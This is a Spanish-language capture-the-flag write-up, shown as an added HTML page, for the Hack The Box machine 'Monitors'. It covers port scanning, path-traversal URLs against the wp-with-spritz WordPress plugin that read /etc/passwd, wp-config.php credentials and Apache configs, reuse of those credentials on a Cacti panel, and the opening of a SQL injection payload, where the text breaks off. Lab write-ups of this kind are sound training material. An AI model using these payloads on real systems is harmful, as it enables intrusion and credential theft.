@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Monitors - Hack The Box</title>
+
+  <link rel="shortcut icon" href="/assets/images/favicon.ico">
+  <link rel="icon" href="/assets/iamges/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/assets/images/favicon.gif" type="image/gif">
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Monitors - Hack The Box | Filthy Hacker</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Monitors - Hack The Box" />
+<meta name="author" content="Mateo Andino" />
+<meta property="og:locale" content="es" />
+<meta name="description" content="Filthy Hacker es un blog dedicado al hacking. ¿Te apasiona la ciberseguridad, o quieres aprender? ¡Este es el lugar! Resolución de máquinas, explicación de vulnerabilidades, CTF’s y varias temáticas relacionadas al hacking." />
+<meta property="og:description" content="Filthy Hacker es un blog dedicado al hacking. ¿Te apasiona la ciberseguridad, o quieres aprender? ¡Este es el lugar! Resolución de máquinas, explicación de vulnerabilidades, CTF’s y varias temáticas relacionadas al hacking." />
+<meta property="og:site_name" content="Filthy Hacker" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-11-11T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Monitors - Hack The Box" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mateo Andino","url":"https://mateonitro550.github.io"},"dateModified":"2024-11-11T00:00:00-05:00","datePublished":"2024-11-11T00:00:00-05:00","description":"Filthy Hacker es un blog dedicado al hacking. ¿Te apasiona la ciberseguridad, o quieres aprender? ¡Este es el lugar! Resolución de máquinas, explicación de vulnerabilidades, CTF’s y varias temáticas relacionadas al hacking.","headline":"Monitors - Hack The Box","mainEntityOfPage":{"@type":"WebPage","@id":"/es/Monitors-Hack-The-Box/"},"url":"/es/Monitors-Hack-The-Box/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- Google Tag Manager -->
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-PPKV9V8T');</script>
+  <!-- End Google Tag Manager -->
+
+</head>
+
+
+
+<body>
+
+  <!-- Google Tag Manager (noscript) -->
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PPKV9V8T"
+  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+  <!-- End Google Tag Manager (noscript) -->
+
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1 class="glitch-header">filthyHacker@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/es"><h2 class="header-link">Publicaciones</h2></a>
+<a href="/es/search"><h2 class="header-link">Buscar</h2></a>
+<a href="/es/archive"><h2 class="header-link">Archivo</h2></a>
+<a href="/en"><h2 class="header-link">English</h2></a>
+
+    </div>
+  </div>
+</header>
+
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Monitors - Hack The Box</h2>
+  <time datetime="2024-11-11T00:00:00-05:00" class="by-line">
+    
+      11/11/2024
+    
+  </time>
+  <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/1.png" alt="Info Card" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>El día de hoy vamos a estar resolviendo la máquina <em>Monitors</em> de <em>Hack The Box</em>.</p>
+
+<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>
+
+<p>Primeramente vamos a lanzar una <em>traza ICMP</em> para saber si la máquina está activa.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.238
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/2.png" alt="2" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la máquina es <code class="language-plaintext highlighter-rouge">63</code>, por lo que podemos intuir que estamos ante una máquina <em>Linux</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Sistema Operativo (OS)</th>
+      <th style="text-align: left">TTL</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">Linux</td>
+      <td style="text-align: left">64</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Windows</td>
+      <td style="text-align: left">128</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Solaris</td>
+      <td style="text-align: left">254</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Si nos damos cuenta, en esta ocasión, el valor del <em>TTL</em> es <code class="language-plaintext highlighter-rouge">63</code> y no <code class="language-plaintext highlighter-rouge">64</code> como indica la tabla anterior, esto se debe a que en el entorno de máquinas de <em>Hack The Box</em>, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el <em>TTL</em> disminuye en una unidad.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.238 -R
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/3a.png" alt="3" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Posteriormente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.238
+</code></pre></div></div>
+
+<p>En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.238
+</code></pre></div></div>
+
+<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-p-</td>
+      <td style="text-align: left">Escanea todo el rango de puertos (65535 en total)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">--open</td>
+      <td style="text-align: left">Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-T5</td>
+      <td style="text-align: left">La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-v</td>
+      <td style="text-align: left"><em>Verbose</em>, reporta lo encontrado por consola</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-n</td>
+      <td style="text-align: left">No aplicar <em>resolución DNS</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sS</td>
+      <td style="text-align: left">Escaneo <em>TCP SYN</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-min-rate</td>
+      <td style="text-align: left">Emitir paquetes no más lentos que &lt;valor&gt; por segundo</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-vvv</td>
+      <td style="text-align: left">Triple <em>verbose</em>, para obtener mayor información por consola</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-Pn</td>
+      <td style="text-align: left">No aplicar <em>host discovery</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,80 10.10.10.238
+</code></pre></div></div>
+
+<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-sC</td>
+      <td style="text-align: left">Scripts básicos de enumeración</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sV</td>
+      <td style="text-align: left">Versión y servicios que corren bajo los puertos encontrados</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p</td>
+      <td style="text-align: left">Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con <code class="language-plaintext highlighter-rouge">SSH</code> (22) y <code class="language-plaintext highlighter-rouge">HTTP</code> (80).</p>
+
+<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>
+
+<p>Para enumerar el servicio <code class="language-plaintext highlighter-rouge">HTTP</code>, usaremos <code class="language-plaintext highlighter-rouge">WhatWeb</code>, una herramienta que se encarga de identificar las tecnologías web que se están utilizando. Esto incluye gestores de contenido (CMS), librerías, plugins, o incluso el sistema operativo en el que se está alojando el servidor web.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.238
+</code></pre></div></div>
+
+<p>El escaneo nos devuelve un código de estado <code class="language-plaintext highlighter-rouge">403 Forbidden</code>, lo que indica que el acceso directo está restringido. Sin embargo, si que podemos ver que el servidor utiliza <code class="language-plaintext highlighter-rouge">Apache 2.4.29</code> como servidor web y revela también una dirección de correo electrónico, aunque esta información no nos revela mucho más de forma directa.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/4.png" alt="4" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Dado que no podemos obtener más información útil desde la terminal, tendremos que visitar la página desde nuestro navegador. Al acceder, observaremos un mensaje que indica que el acceso directo por IP no está permitido y sugiere contactar con el administrador del sitio mediante un correo electrónico cuyo dominio es <code class="language-plaintext highlighter-rouge">monitors.htb</code>. Esto es una pista importante, ya que un dominio en el correo electrónico sugiere que el servidor está configurado con <code class="language-plaintext highlighter-rouge">virtual hosting</code>; es decir, el servidor usa nombres de dominio específicos para identificar los sitios alojados.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/5.png" alt="5" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Para verificarlo, editamos el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que el nombre de dominio se resuelva a la dirección IP del servidor correspondiente.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/6.png" alt="6" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Una vez realizado este cambio, al relanzar nuestros escaneos con <code class="language-plaintext highlighter-rouge">Nmap</code> y <code class="language-plaintext highlighter-rouge">WhatWeb</code>, ahora obtenemos mucha más información:</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/7.png" alt="7" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/8.png" alt="8" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Lo más relevante que encontramos en este nuevo escaneo es que el servidor está utilizando <code class="language-plaintext highlighter-rouge">WordPress 5.5.1</code>, lo que nos permite identificar el gestor de contenido utilizado, además de confirmar que el servidor está corriendo sobre <code class="language-plaintext highlighter-rouge">Ubuntu</code>.</p>
+
+<p>Después de un rato explorando la página, no encontramos nada de especial interés. No obstante, sabiendo que el sitio utiliza <code class="language-plaintext highlighter-rouge">WordPress</code>, podemos buscar rutas comunes como paneles de administración, directorios de contenido y otras rutas típicas del <em>CMS</em>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/9.png" alt="9" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>En mi caso, decidí aplicar <em>fuzzing</em> para encontrar estas rutas potenciales.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -L -t 400 --hc 404 --hh 12759 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/FUZZ
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/10.png" alt="10" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Entre las rutas halladas, encontramos el panel de administración <code class="language-plaintext highlighter-rouge">wp-admin</code>; sin embargo, intentar acceder con credenciales conocidas por defecto no será efectivo en este caso.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/11.png" alt="11" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>También descubrimos que el directorio <code class="language-plaintext highlighter-rouge">wp-content</code> es accesible, lo cual representa un error de configuración, ya que este directorio contiene recursos del <em>CMS</em> que deberían estar protegidos. Dentro de este directorio, podemos realizar un segundo <em>fuzzing</em> (o, alternativamente, podríamos buscar manualmente rutas específicas), llevándonos al directorio <code class="language-plaintext highlighter-rouge">plugins</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -L -t 400 --hc 404 --hh 0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/wp-content/FUZZ
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/12.png" alt="12" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Allí encontramos el plugin <code class="language-plaintext highlighter-rouge">wp-with-spritz</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/13.png" alt="13" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/14.png" alt="14" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Al descargar su archivo <code class="language-plaintext highlighter-rouge">readme.txt</code> y revisarlo, confirmamos que se está utilizando la versión 1.0 de este plugin.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/15.png" alt="15" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Con esta información, podemos pasar a investigar si esta versión presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en <em>Exploit Database</em> —por ejemplo—, o directamente desde la consola usando <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit spritz
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/16.png" alt="16" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Encontramos un exploit para este plugin en esta versión que explota una vulnerabilidad <code class="language-plaintext highlighter-rouge">Remote File Inclusion</code> (RFI).</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/17.png" alt="17" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Para verificar si esto funciona, podemos crear un archivo de texto cualquiera y, mediante <em>Python</em>, podemos hostear un servidor <em>HTTP</em> desde la misma ruta del archivo para que sea accesible mediante:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+</code></pre></div></div>
+
+<p>Ahora, si apuntamos a la ruta URL que aparece a continuación, veremos que podemos leer el contenido que habíamos escrito en nuestro archivo de texto.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://&lt;nuestraIP&gt;:80/&lt;nombreArchivo&gt;
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/18.png" alt="18" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Sin embargo, si intentamos cargar una <em>reverse shell</em>, esta no se ejecutará debido a que el <code class="language-plaintext highlighter-rouge">RFI</code> utiliza la función <code class="language-plaintext highlighter-rouge">file_get_contents</code>, que simplemente lee el contenido de un archivo o URL como texto sin interpretar o ejecutar ningún código <em>PHP</em> que contenga.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/19.png" alt="19" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>No obstante, aunque no podamos explotar este <code class="language-plaintext highlighter-rouge">RFI</code>, sí que podemos aprovecharnos del <code class="language-plaintext highlighter-rouge">Local File Inclusion</code> (LFI), vulnerabilidad que ya explicamos en un <a href="https://mateonitro550.github.io/es/Local-File-Inclusion-(LFI)/">artículo anterior</a>. Confirmamos que tenemos capacidad de lectura, ya que logramos listar el contenido del <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/passwd
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/20.png" alt="20" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Leer este archivo desde el navegador puede ser complicado, así que podríamos utilizar <code class="language-plaintext highlighter-rouge">Ctrl + U</code> para verlo de mejorar manera.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/21.png" alt="21" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Dado que tenemos acceso a archivos en el sistema, el siguiente paso lógico es buscar archivos de configuración importantes. Por ejemplo, el archivo <code class="language-plaintext highlighter-rouge">wp-config.php</code> de <code class="language-plaintext highlighter-rouge">WordPress</code> suele contener información sensible, como el nombre de usuario, la contraseña y el nombre de la base de datos necesarios para que <code class="language-plaintext highlighter-rouge">WordPress</code> se conecte a su base de datos. Este archivo, por defecto, se encuentra en <code class="language-plaintext highlighter-rouge">/var/www/wordpress</code>, por lo que podríamos acceder a esta ruta para leer su contenido.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../var/www/wordpress/wp-config.php
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/22.png" alt="22" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Aunque podemos probar estas credenciales en el panel <code class="language-plaintext highlighter-rouge">wp-admin</code>, no nos permitirán acceder.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/23.png" alt="23" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Lo siguiente sería explorar los archivos de configuración de <code class="language-plaintext highlighter-rouge">Apache</code>. <code class="language-plaintext highlighter-rouge">Apache</code> se instala por defecto en <code class="language-plaintext highlighter-rouge">/etc/apache2/</code>, por lo que podemos intentar leer el archivo <code class="language-plaintext highlighter-rouge">apache2.conf</code>, el cual es el archivo principal de configuración del servidor web. Además, este archivo nos provee una visión básica de la estructura jerárquica de sus archivos de configuración, lo cual nos sugiere rutas potenciales donde buscar archivos adicionales de interés.</p>
+
+<p>Para entender mejor esta jerarquía y adaptarnos a las configuraciones específicas de este servidor, podemos referirnos a esta <a href="https://cwiki.apache.org/confluence/display/httpd/DistrosDefaultLayout#DistrosDefaultLayout-Debian,Ubuntu(Apachehttpd2.x):">documentación</a>. Es importante tener en cuenta que, como observamos al inicio, <code class="language-plaintext highlighter-rouge">Apache</code> está corriendo sobre <code class="language-plaintext highlighter-rouge">Ubuntu</code>, por lo que su configuración puede diferir en otros sistemas operativos, donde ciertas rutas o archivos de configuración pueden estar ubicados en lugares diferentes.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/24.png" alt="24" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Ya sea porque intuimos que puede haber configuraciones adicionales o porque revisamos minuciosamente los archivos de configuración de <code class="language-plaintext highlighter-rouge">Apache</code>, encontramos pistas sobre la posible existencia de dominios adicionales. Por ejemplo, en el archivo <code class="language-plaintext highlighter-rouge">ports.conf</code> se menciona que cualquier cambio de puerto o adición de puertos puede requerir ajustes en la declaración <em>VirtualHost</em> de <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code>. Esto nos recuerda que el servidor está aplicando <code class="language-plaintext highlighter-rouge">virtual hosting</code> desde el inicio, lo que podría indicar la presencia de dominios que aún desconocemos.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/ports.conf
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/25.png" alt="25" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Al examinar el archivo <code class="language-plaintext highlighter-rouge">000-default.conf</code>, descubrimos que el servidor, en efecto, aloja un segundo dominio. También notamos que esta configuración es la que se usa para el acceso predeterminado cuando no se aplica un dominio específico, mostrando el mismo mensaje que vimos al intentar acceder por IP, en el cual se nos indica que el acceso directo está restringido.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-enabled/000-default.conf
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/26.png" alt="26" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Dado que <code class="language-plaintext highlighter-rouge">Apache</code> organiza la configuración de sitios virtuales en el directorio <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-available/</code>, aquí es donde buscamos los archivos <em>.conf</em> que definen cada dominio. Al revisar <code class="language-plaintext highlighter-rouge">monitors.htb.conf</code>, vemos que el dominio <code class="language-plaintext highlighter-rouge">monitors.htb</code> tiene configurada su raíz en <code class="language-plaintext highlighter-rouge">/var/www/wordpress</code>, tal como asumimos inicialmente al identificar el uso de <code class="language-plaintext highlighter-rouge">WordPress</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-enabled/monitors.htb.conf
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/27.png" alt="27" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Por otro lado, al inspeccionar <code class="language-plaintext highlighter-rouge">cacti-admin.monitors.htb.conf</code>, descubrimos que el dominio <code class="language-plaintext highlighter-rouge">cacti-admin.monitors.htb</code> tiene su contenido ubicado en <code class="language-plaintext highlighter-rouge">/usr/share/cacti</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/28.png" alt="28" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Con esta información y sabiendo de la existencia de este segundo dominio, podemos añadirlo también al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y explorar de que se trata.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/29.png" alt="29" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Al llegar a este segundo dominio, <code class="language-plaintext highlighter-rouge">cacti-admin.monitors.htb</code>, nos encontramos con un panel de inicio de sesión en <code class="language-plaintext highlighter-rouge">Cacti</code>. <code class="language-plaintext highlighter-rouge">Cacti</code> es una herramienta de monitoreo de redes que permite la recopilación y graficación de datos de rendimiento en redes. Podemos probar con las credenciales que obtuvimos previamente en el archivo <code class="language-plaintext highlighter-rouge">wp-config.php</code>, y vemos que funcionan, lo cual demuestra otra mala práctica de seguridad: la reutilización de credenciales.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/30.png" alt="30" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Una vez dentro, notamos que estamos ante la versión <code class="language-plaintext highlighter-rouge">1.2.12</code> de <code class="language-plaintext highlighter-rouge">Cacti</code>, lo cual nos lleva a investigar si esta versión tiene vulnerabilidades conocidas.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/31.png" alt="31" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Para verificarlo, podemos hacer una búsqueda en línea, en <em>Exploit Database</em>, o directamente desde la consola con <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit cacti 1.2.12
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/32.png" alt="32" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Esta búsqueda revela una vulnerabilidad de <a href="https://mateonitro550.github.io/SQL-Injection">inyección SQL</a> en uno de los parámetros de la aplicación. Aunque podríamos ejecutar el exploit tal como está, resulta más valioso entender su funcionamiento para practicar <code class="language-plaintext highlighter-rouge">inyecciones SQL</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/33.png" alt="33" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Para acceder, en la interfaz de <code class="language-plaintext highlighter-rouge">Cacti</code>, vamos al menú izquierdo, en la sección <em>Presets</em>, donde se encuentra la opción <em>Color</em>. Aquí se despliega una tabla con diversas configuraciones de colores. La vulnerabilidad se explota usando el parámetro <code class="language-plaintext highlighter-rouge">filter</code>, al que podemos inyectar comandos SQL para manipular las consultas a la base de datos en la URL que aparece a continuación:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/34.png" alt="34" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Comenzaremos inyectando el payload clásico <code class="language-plaintext highlighter-rouge">')+UNION+SELECT+NULL;--+-</code> para calcular el número de columnas en la consulta.</p>
+
